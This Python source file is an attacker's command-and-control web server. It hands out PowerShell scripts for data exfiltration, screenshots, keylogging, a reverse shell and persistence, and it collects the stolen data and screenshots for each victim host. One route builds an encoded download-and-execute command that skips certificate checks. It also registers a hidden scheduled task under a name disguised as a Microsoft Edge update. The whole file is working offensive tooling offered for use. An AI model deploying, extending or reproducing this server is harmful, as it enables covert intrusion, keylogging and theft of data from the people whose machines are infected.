from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse
from urllib.parse import unquote
import os
import logging
import base64
from datetime import datetime
import ssl
import config
import sys
import uuid
import random
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning) 

CURRENT_DIR = os.getcwd()
PROTOCOL = config.server['SERVER_PROTOCOL']

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def log_request(self, code):
        log('[+] New connection from [' + self.client_address[0] + ':' + str(self.client_address[1]) + ']',print_console=True,trace_time=True)
        log(self.command  + ' ' + self.path + ' ' + self.request_version + '\n' + str(self.headers),print_console=True,trace_time=False)

    def do_GET(self):
        headers = self.headers
        if self.path == '/all':
            try:
                file_to_open = open('scripts/client_exf.ps1','r').read()
                file_to_open = file_to_open.replace('SERVER_EXTERNAL_IP',config.exfiltration['SERVER_EXTERNAL_IP'])
                file_to_open = file_to_open.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
                file_to_open = file_to_open.replace('SERVER_PROTOCOL',PROTOCOL)
                file_to_open2 = open('scripts/client_rvs.ps1','r').read()
                file_to_open2 = file_to_open2.replace('SERVER_EXTERNAL_IP',config.reverseshell['SERVER_EXTERNAL_IP'])
                file_to_open2 = file_to_open2.replace('SERVER_EXTERNAL_PORT',config.reverseshell['SERVER_EXTERNAL_PORT'])
                file_to_open2 = file_to_open2.replace('SERVER_PROTOCOL',PROTOCOL)
                file_to_open3 = open('scripts/client_screen.ps1','r').read()
                file_to_open3 = file_to_open3.replace('SERVER_EXTERNAL_IP',config.exfiltration['SERVER_EXTERNAL_IP'])
                file_to_open3 = file_to_open3.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
                file_to_open3 = file_to_open3.replace('SERVER_PROTOCOL',PROTOCOL)
                self.send_response(200)
                self.send_header('Content-type','text')
                self.end_headers()
                self.wfile.write(bytes(file_to_open,'utf-8')+bytes(file_to_open3,'utf-8')+bytes(file_to_open2,'utf-8'))
                log('[+] File client_exf.ps1 has been requested and was sent!',print_console=True,trace_time=True)
                log('[+] File client_screen.ps1 has been requested and was sent!',print_console=True,trace_time=True)
                log('[+] File client_rvs.ps1 has been requested and was sent!',print_console=True,trace_time=True)
            except:
                log('[-] Error while sending files.',print_console=True,trace_time=True)
                self.send_response(404)
                self.wfile.write(b'Not Found')
        elif self.path == '/exfpers':
            try:
                file_to_open = open('scripts/client_exf.ps1','r').read()
                file_to_open = file_to_open.replace('SERVER_EXTERNAL_IP',config.exfiltration['SERVER_EXTERNAL_IP'])
                file_to_open = file_to_open.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
                file_to_open = file_to_open.replace('SERVER_PROTOCOL',PROTOCOL)
                file_to_open2 = open('scripts/client_pers.ps1','r').read()
                file_to_open2 = file_to_open2.replace('BASE64_ENCODED_PAYLOAD_UTF16LE',config.persistence['BASE64_ENCODED_PAYLOAD_UTF16LE'])
                file_to_open3 = open('scripts/client_screen.ps1','r').read()
                file_to_open3 = file_to_open3.replace('SERVER_EXTERNAL_IP',config.exfiltration['SERVER_EXTERNAL_IP'])
                file_to_open3 = file_to_open3.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
                file_to_open3 = file_to_open3.replace('SERVER_PROTOCOL',PROTOCOL)
                self.send_response(200)
                self.send_header('Content-type','text')
                self.end_headers()
                self.wfile.write(bytes(file_to_open,'utf-8')+bytes(file_to_open3,'utf-8')+bytes(file_to_open2,'utf-8'))
                log('[+] File client_exf.ps1 has been requested and was sent!',print_console=True,trace_time=True)
                log('[+] File client_screen.ps1 has been requested and was sent!',print_console=True,trace_time=True)
                log('[+] File client_pers.ps1 has been requested and was sent!',print_console=True,trace_time=True)
            except:
                log('[-] Error while sending files.',print_console=True,trace_time=True)
                self.send_response(404)
                self.wfile.write(b'Not Found')
        elif self.path == '/exf':
            try:
                file_to_open = open('scripts/client_exf.ps1','r').read()
                file_to_open = file_to_open.replace('SERVER_EXTERNAL_IP',config.exfiltration['SERVER_EXTERNAL_IP'])
                file_to_open = file_to_open.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
                file_to_open = file_to_open.replace('SERVER_PROTOCOL',PROTOCOL)
                self.send_response(200)
                self.send_header('Content-type','text')
                self.end_headers()
                self.wfile.write(bytes(file_to_open,'utf-8'))
                log('[+] File client_exf.ps1 has been requested and was sent!',print_console=True,trace_time=True)
            except:
                log('[-] File client_exf.ps1 does not exist.',print_console=True,trace_time=True)
                self.send_response(404)
                self.wfile.write(b'Not Found')
        elif self.path == '/klogger':
            try:
                file_to_open = open('scripts/client_logger.ps1','r').read()
                file_to_open = file_to_open.replace('OUTPUT_PATH',config.logger['OUTPUT_PATH'])
                self.send_response(200)
                self.send_header('Content-type','text')
                self.end_headers()
                self.wfile.write(bytes(file_to_open,'utf-8'))
                log('[+] File client_logger.ps1 has been requested and was sent!',print_console=True,trace_time=True)
            except:
                log('[-] File client_logger.ps1 does not exist.',print_console=True,trace_time=True)
                self.send_response(404)
                self.wfile.write(b'Not Found')
        elif self.path == '/klogger_exf':
            try:
                file_to_open = open('scripts/client_logger_exf.ps1','r').read()
                file_to_open = file_to_open.replace('SERVER_EXTERNAL_IP',config.exfiltration['SERVER_EXTERNAL_IP'])
                file_to_open = file_to_open.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
                file_to_open = file_to_open.replace('SERVER_PROTOCOL',PROTOCOL)
                file_to_open = file_to_open.replace('OUTPUT_PATH',config.logger['OUTPUT_PATH'])
                self.send_response(200)
                self.send_header('Content-type','text')
                self.end_headers()
                self.wfile.write(bytes(file_to_open,'utf-8'))
                log('[+] File client_logger_exf.ps1 has been requested and was sent!',print_console=True,trace_time=True)
            except:
                log('[-] File client_logger_exf.ps1 does not exist.',print_console=True,trace_time=True)
                self.send_response(404)
                self.wfile.write(b'Not Found')
        elif self.path == '/klogger_full':
            try:
                file_to_open = open('scripts/client_logger.ps1','r').read()
                file_to_open = file_to_open.replace('OUTPUT_PATH',config.logger['OUTPUT_PATH'])
                klogger_full_payload = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$w=(New-Object Net.WebClient);IEX $w.DownloadString('SERVER_PROTOCOL://SERVER_EXTERNAL_IP:SERVER_EXTERNAL_PORT/klogger_exf');"
                klogger_full_payload = klogger_full_payload.replace('SERVER_EXTERNAL_IP',config.exfiltration['SERVER_EXTERNAL_IP'])
                klogger_full_payload = klogger_full_payload.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
                klogger_full_payload = klogger_full_payload.replace('SERVER_PROTOCOL',PROTOCOL)
                klogger_full_payload_encoded = encodeToBase64_UTF16LE(klogger_full_payload)
                klogger_full_TASK = '$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep b -nop -windowstyle hidden -e BASE64_ENCODED_PAYLOAD_UTF16LE";$Trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(60) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration (New-TimeSpan -Hours 4380);$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings (New-ScheduledTaskSettingsSet);Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineKernel" -InputObject $Task -Force;'
                klogger_full_TASK = klogger_full_TASK.replace('BASE64_ENCODED_PAYLOAD_UTF16LE',klogger_full_payload_encoded.decode('utf-8'))
                self.send_response(200)
                self.send_header('Content-type','text')
                self.end_headers()
                self.wfile.write(bytes(klogger_full_TASK,'utf-8')+bytes(file_to_open,'utf-8'))
                log('[+] File client_logger.ps1 has been requested and was sent!',print_console=True,trace_time=True)
                log('[+] Sent a new scheduled task to retrieve klogger file every 2 minutes (MicrosoftEdgeUpdateTaskMachineKernel)!',print_console=True,trace_time=True)
            except Exception as e:
                log('[-] File client_logger.ps1 does not exist.',print_console=True,trace_time=True)
                print(str(e))
                self.send_response(404)
                self.wfile.write(b'Not Found')
        elif self.path == '/rvs':
            try:
                file_to_open = open('scripts/client_rvs.ps1','r').read()
                file_to_open = file_to_open.replace('SERVER_EXTERNAL_IP',config.reverseshell['SERVER_EXTERNAL_IP'])
                file_to_open = file_to_open.replace('SERVER_EXTERNAL_PORT',config.reverseshell['SERVER_EXTERNAL_PORT'])
                self.send_response(200)
                self.send_header('Content-type','text')
                self.end_headers()
                self.wfile.write(bytes(file_to_open,'utf-8'))
                log('[+] File client_rvs.ps1 has been requested and was sent!',print_console=True,trace_time=True)
            except:
                log('[-] File client_rvs.ps1 does not exist.',print_console=True,trace_time=True)
                self.send_response(404)
                self.wfile.write(b'Not Found')
        elif self.path == '/pers':
            try:
                file_to_open = open('scripts/client_pers.ps1','r').read()
                file_to_open = file_to_open.replace('BASE64_ENCODED_PAYLOAD_UTF16LE',config.persistence['BASE64_ENCODED_PAYLOAD_UTF16LE'])
                self.send_response(200)
                self.send_header('Content-type','text')
                self.end_headers()
                self.wfile.write(bytes(file_to_open,'utf-8'))
                log('[+] File client_pers.ps1 has been requested and was sent!',print_console=True,trace_time=True)
            except:
                log('[-] File client_pers.ps1 does not exist.',print_console=True,trace_time=True)
                self.send_response(404)
                self.wfile.write(b'Not Found')
        elif self.path == '/screen':
            try:
                file_to_open = open('scripts/client_screen.ps1','r').read()
                file_to_open = file_to_open.replace('SERVER_EXTERNAL_IP',config.exfiltration['SERVER_EXTERNAL_IP'])
                file_to_open = file_to_open.replace('SERVER_EXTERNAL_PORT',config.exfiltration['SERVER_EXTERNAL_PORT'])
                file_to_open = file_to_open.replace('SERVER_PROTOCOL',PROTOCOL)
                self.send_response(200)
                self.send_header('Content-type','text')
                self.end_headers()
                self.wfile.write(bytes(file_to_open,'utf-8'))
                log('[+] File client_screen.ps1 has been requested and was sent!',print_console=True,trace_time=True)
            except:
                log('[-] File client_screen.ps1 does not exist.',print_console=True,trace_time=True)
                self.send_response(404)
                self.wfile.write(b'Not Found')
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Not Found')

    def do_POST(self):
        headers = self.headers
        if headers['Proof']:    
            content_length = int(self.headers['Content-Length'])
            body = self.rfile.read(content_length).decode("utf-8")
            params = parseBODY(body)
            self.send_response(200)
            self.send_header('Content-type','text')
            self.end_headers()
            self.wfile.write(b'Ok')
            if params is not None:
                if 'hostname' in params:
                    hostname_bytes = base64.b64decode(unquote(params['hostname'])).replace(b'\x00',b'')
                    hostname_str = hostname_bytes.decode("windows-1252")
                    hostname_str = renameHostname(hostname_str)
                    if not os.path.exists(CURRENT_DIR + '/output/'):
                        os.mkdir(CURRENT_DIR + '/output/',mode = 0o777)
                        log('[+] Created folder: ' + CURRENT_DIR + '/output/',print_console=True,trace_time=True)
                    if not os.path.exists(CURRENT_DIR + '/output/' + hostname_str):
                        os.mkdir(CURRENT_DIR + '/output/' + hostname_str,mode = 0o777)
                        log('[+] Created folder: ' + CURRENT_DIR + '/output/' + hostname_str,print_console=True,trace_time=True)
                    for key in params:
                        if key != 'hostname' and key != 'screenshot':
                            param = params[key]
                            param_bytes = base64.b64decode(unquote(param))
                            param_str = param_bytes.decode("windows-1252")
                            file = open(CURRENT_DIR + '/output/' + hostname_str + '/' + key + '.txt','w+',encoding='windows-1252')
                            file.write(param_str)
                            file.close()
                            log('[+] File written: ' + CURRENT_DIR + '/output/' + hostname_str + '/' + key + '.txt\n',print_console=True,trace_time=True)
                        elif key == 'screenshot':
                            param = params[key]
                            param_bytes = base64.b64decode(unquote(param))
                            timestamp = int(datetime.now().timestamp())
                            file = open(CURRENT_DIR + '/output/' + hostname_str + '/' + key + "_" + str(timestamp) + '.png', "wb")
                            file.write(param_bytes)
                            file.close()
                            log('[+] File written: ' + CURRENT_DIR + '/output/' + hostname_str + '/' + key + "_" + str(timestamp) + '.png\n',print_console=True,trace_time=True)
                else:
                    for key in params:
                        if key != 'hostname':
                            param = params[key]
                            param_bytes = base64.b64decode(unquote(param))
                            param_str = param_bytes.decode("windows-1252")
                            file = open(CURRENT_DIR + '/output/' + key + '.txt','w+',encoding='windows-1252')
                            file.write(param_str)
                            file.close()
                            log('[+] File written: ' + CURRENT_DIR + '/' + key + '.txt\n',print_console=True,trace_time=True)
            else:
                self.send_response(200)
                self.send_header('Content-type','text')
                self.end_headers()
                self.wfile.write(b'Ok')
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'Not Found')

#Rename a hostname to clean special chars
#This prevents unwanted names when creating the hostname folder
def renameHostname(hostname):
    chars_to_replace = ['.','\\','/',':','*','?','"','<','>','|']
    for char in chars_to_replace:
        hostname = hostname.replace(char,'_')
    return hostname

#Generate a random uuid
def generateUUID():
    result = uuid.uuid4()
    return(str(result))

#Generate a random string with length defined in input (default 10)
def generateRandomString(length=10):
    possible_chars = ['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
    result = ''.join(random.choice(possible_chars) for _ in range(length))
    return result

#Encode a string to Base64 after converting it to UTF-16 Little Endian
def encodeToBase64_UTF16LE(input_string):
    try:
        utf16_le_encoded = input_string.encode('utf-16-le')
        base64_encoded = base64.b64encode(utf16_le_encoded)
        return base64_encoded
    except Exception as e:
        print(f"Error while encoding : {e}")
        return None

#Loggin function of events in the current folder
#To print the logs in console output, set log(Text,True)
def log(text,print_console=False,trace_time=True):
    current_datetime = datetime.now()
    current_date_time = current_datetime.strftime('%Y-%m-%d %H:%M:%S')
    log_file = open(CURRENT_DIR + '/' + 'logs.txt','a',encoding='utf-8')
    if trace_time:
        log_file.write(current_date_time + "  " + text + '\n')
    else:
        log_file.write(text + '\n')
    log_file.close()
    if print_console:
        print(text)

#Returns a dictionary with POST parameters : {'param1':'value1',...}
#Input is a full body as sent in a POST request
def parseBODY(body):
    result = {}
    params = body.split("&")
    for param in params:
        param_name = param.split("=")[0]
        param_value = param.split("=")[1]
        result[param_name] = param_value
    return result
        
#Returns a dictionary with GET parameters : {'param1':'value1',...}
def parseURL(path):
    result = {}
    query = urlparse(path).query
    if query is not None and query != '':
        query_split = query.split('&')
        for el in query_split:
            subsplit = el.split("=")
            key = subsplit[0]
            result[key] = subsplit[1]
        return result
    else:
        return None

if PROTOCOL == 'https':
    if not os.path.isfile(config.server['CERT_KEYFILE']):
        print("[-] Certificate key file not found, check config.py")
        sys.exit()

    if not os.path.isfile(config.server['CERT_PEMFILE']):
        print("[-] Certificate file not found, check config.py")
        sys.exit()

httpd = HTTPServer((config.server['SERVER_LISTEN_ON_LOCAL_IP'],int(config.server['SERVER_LISTEN_ON_LOCAL_PORT'])), SimpleHTTPRequestHandler)
if PROTOCOL == 'https':
    httpd.socket = ssl.wrap_socket (httpd.socket,keyfile=config.server['CERT_KEYFILE'],certfile=config.server['CERT_PEMFILE'], server_side=True)
    log("[+] Starting server on " + config.server['SERVER_LISTEN_ON_LOCAL_IP'] + ":" + str(config.server['SERVER_LISTEN_ON_LOCAL_PORT'] + ' with HTTPS'),print_console=True,trace_time=True)
else:
    log("[+] Starting server on " + config.server['SERVER_LISTEN_ON_LOCAL_IP'] + ":" + str(config.server['SERVER_LISTEN_ON_LOCAL_PORT'] + ' with HTTP'),print_console=True,trace_time=True)
httpd.serve_forever()
